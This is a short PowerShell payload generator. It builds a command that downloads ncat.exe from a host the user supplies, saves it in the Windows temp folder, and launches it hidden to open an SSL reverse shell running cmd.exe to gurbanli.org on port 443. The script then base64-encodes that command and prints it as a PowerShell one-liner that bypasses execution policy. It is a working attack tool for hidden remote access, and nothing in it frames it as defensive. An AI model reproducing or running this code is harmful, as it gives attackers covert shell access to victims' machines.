[CmdletBinding()]
param(
    [Parameter (Mandatory=$true)]
    [string] $HostAddress
)

$command = '$url = "http://{0}/ncat.exe";$outpath = "C:\Windows\Temp\ncat.exe";Invoke-WebRequest -Uri $url -OutFile $outpath;$args = @("--ssl","gurbanli.org","443","--exec","cmd.exe");Start-Process -WindowStyle Hidden -FilePath $outpath -ArgumentList $args;' -f $HostAddress
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

Write-Output "powershell.exe -nop -ep bypass -noni -encodedCommand ""$encodedCommand"" "
